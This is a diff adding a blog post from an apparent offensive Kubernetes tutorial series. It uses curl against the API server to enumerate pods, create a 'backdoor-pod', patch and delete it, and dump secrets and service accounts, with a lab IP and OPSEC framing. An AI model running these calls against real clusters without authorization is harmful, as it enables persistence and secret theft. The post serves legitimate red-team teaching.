@@ -1,0 +1,120 @@
+---
+title: "Abusing the Kubernetes API with curl"
+description: "Create, patch, and delete pods over the Kubernetes REST API without kubectl when you have API server access."
+date: 2025-12-22
+seriesSlug: "kubernetes-offensive"
+seriesTitle: "Attacking Kubernetes"
+seriesPart: 4
+seriesDescription: "Offensive Kubernetes: recon through RBAC abuse, pod escapes, persistence, and cloud pivot."
+tags: ["kubernetes", "api", "red-team", "kubernetes-offensive"]
+---
+
+Sometimes you have API access but no `kubectl` on the box. Or you want to script attacks without dropping a binary. The Kubernetes API is plain HTTPS + JSON.
+
+Assumption for this post: you have credentials or a misconfiguration granting API access (cluster-admin token, anonymous RBAC bug, stolen kubeconfig). All examples use `-k` to skip TLS verification in lab environments. Use proper CA validation in your own tooling.
+
+## List pods
+
+```bash
+curl -ks https://192.168.13.128:6443/api/v1/pods | jq
+```
+
+Full cluster inventory: images, env vars, mounts, IPs.
+
+## Create a pod
+
+```bash
+curl -sk https://192.168.13.128:6443/api/v1/namespaces/default/pods \
+  -H "Content-Type: application/json" \
+  -d '{
+  "apiVersion": "v1",
+  "kind": "Pod",
+  "metadata": { "name": "backdoor-pod" },
+  "spec": {
+    "containers": [{
+      "name": "alpine",
+      "image": "alpine",
+      "command": ["sh", "-c", "sleep 3600"]
+    }]
+  }
+}'
+```
+
+<figure style="text-align:center; margin: 1.25rem 0;" class="blog-figure-wide">
+  <img src="/resources/kubernetes/Pasted-image-20251222110723.png" alt="API response after creating backdoor pod" style="display:block; margin:0 auto; max-width:100%; height:auto;" />
+</figure>
+
+The response includes UID, resourceVersion, and status. Save the metadata for later patches.
+
+Add auth header when required:
+
+```bash
+curl -sk https://<api>:6443/api/v1/namespaces/default/pods \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d @pod.json
+```
+
+## Patch an existing pod
+
+Merge-patch to add a label:
+
+```bash
+curl -k -X PATCH \
+  https://192.168.13.128:6443/api/v1/namespaces/default/pods/backdoor-pod \
+  -H "Content-Type: application/merge-patch+json" \
+  -d '{"metadata":{"labels":{"hacked":"true"}}}'
+```
+
+<figure style="text-align:center; margin: 1.25rem 0;" class="blog-figure-wide">
+  <img src="/resources/kubernetes/Pasted-image-20251222111102.png" alt="pod label patched via API" style="display:block; margin:0 auto; max-width:100%; height:auto;" />
+</figure>
+
+Patch types:
+
+- `application/merge-patch+json`: shallow merge
+- `application/json-patch+json`: RFC 6902 operations
+- `application/strategic-merge-patch+json`: Kubernetes-aware merge (used by `kubectl apply`)
+
+## Delete a pod
+
+```bash
+curl -k -X DELETE \
+  https://192.168.13.128:6443/api/v1/namespaces/default/pods/backdoor-pod
+```
+
+## Useful API paths
+
+```bash
+# secrets (needs RBAC)
+curl -ks -H "Authorization: Bearer $TOKEN" \
+  https://<api>:6443/api/v1/namespaces/<ns>/secrets | jq
+
+# service accounts
+curl -ks -H "Authorization: Bearer $TOKEN" \
+  https://<api>:6443/api/v1/namespaces/<ns>/serviceaccounts | jq
+
+# cluster roles
+curl -ks -H "Authorization: Bearer $TOKEN" \
+  https://<api>:6443/apis/rbac.authorization.k8s.io/v1/clusterroles | jq
+```
+
+## API discovery
+
+```bash
+curl -ks https://<api>:6443/ | jq
+curl -ks https://<api>:6443/apis | jq
+```
+
+The root response lists all API groups and versions. Use it to find CRDs and admission webhooks in unfamiliar clusters.
+
+## Why curl instead of kubectl
+
+- No binary on disk (OPSEC in some scenarios).
+- Easy to embed in Python/Go scripts.
+- Direct control over HTTP for timing and error handling.
+- Works through restrictive shells that block binary downloads but allow outbound HTTPS.
+
+`kubectl` is still better for day-to-day work. These curls are for when you are operating through a hole, not replacing your normal workflow.
+
+Next: escaping to the host through an exposed Docker/containerd TCP socket.
